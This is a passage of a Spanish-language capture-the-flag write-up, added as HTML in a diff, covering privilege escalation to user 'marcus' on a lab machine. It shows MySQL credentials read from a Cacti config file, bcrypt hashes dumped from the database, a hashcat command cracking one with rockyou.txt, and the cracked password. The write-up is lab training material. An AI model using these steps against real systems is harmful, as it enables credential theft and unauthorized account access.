+                <p>Para completar la máquina correctamente, necesito obtener acceso de usuario a la cuenta de <code>marcus</code>. La ruta intencionada era probablemente obtener acceso de usuario primero, luego usar local port forwarding de SSH en lugar de chisel.</p>
+
+                <h3>Enumeración de MySQL</h3>
+                <p>En <code>/var/www/html/cacti/include/config.php</code>, encuentro credenciales de MySQL:</p>
+                <pre><code class="language-php">$database_username = 'cactiuser';
+$database_password = 'cactiuser';</code></pre>
+
+                <p>Diferentes usuarios de MySQL pueden tener acceso a diferentes recursos, así que me conecto para explorar otras bases de datos. Encuentro una base de datos llamada <code>cacti</code> (diferente de la <code>monitorsthree_db</code> encontrada mediante SQLi), y en la tabla <code>user_auth</code>, descubro hashes de contraseñas:</p>
+                <p><img src="./media/image5.png" alt="Salida de MySQL mostrando tabla user_auth con hashes de contraseñas" /></p>
+
+                <p>El hash de Marcus es particularmente interesante en este punto.</p>
+
+                <h3>Crackeo de Contraseñas</h3>
+                <p>Crackeo el hash usando hashcat con modo 3200 para bcrypt:</p>
+                <pre><code class="language-bash">hashcat -m 3200 '$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK' /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>El hash se crackea exitosamente:</p>
+                <pre><code class="language-plaintext">$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910</code></pre>
+
+                <p>Verifico que estas credenciales funcionan para el usuario <code>marcus</code>:</p>
+                <pre><code class="language-plaintext">marcus:12345678910</code></pre>
+
+                <p>Ahora puedo autenticarme como marcus mediante SSH o cambiar de usuario en el sistema, permitiéndome recuperar la flag de usuario y completar la máquina a través de la ruta intencionada.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
